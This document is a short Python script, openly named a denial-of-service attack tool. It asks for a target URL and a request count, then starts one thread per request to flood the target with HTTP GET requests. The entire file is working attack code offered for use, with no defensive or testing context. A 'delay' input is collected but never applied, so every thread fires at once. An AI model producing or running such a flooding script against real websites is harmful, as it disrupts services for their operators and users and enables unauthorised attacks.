import requests
import threading
import time

def send_request(url, delay):
    try:
        response = requests.get(url)
        print(f"[+] Sent request to {url}, Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

def dos_attack():
    target_url = input("Enter the target URL for DoS attack (e.g. http://example.com): ")
    request_count = int(input("Enter the number of requests to send: "))
    delay = float(input("Enter delay between requests (in seconds): "))

    print(f"\n[+] Starting DoS Attack on {target_url}...")
    print(f"[+] Sending {request_count} requests with {delay}s delay between each request.\n")

    threads = []
    for _ in range(request_count):
        t = threading.Thread(target=send_request, args=(target_url, delay))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print(f"\n[✓] DoS Attack completed on {target_url}.")

if __name__ == "__main__":
    dos_attack()
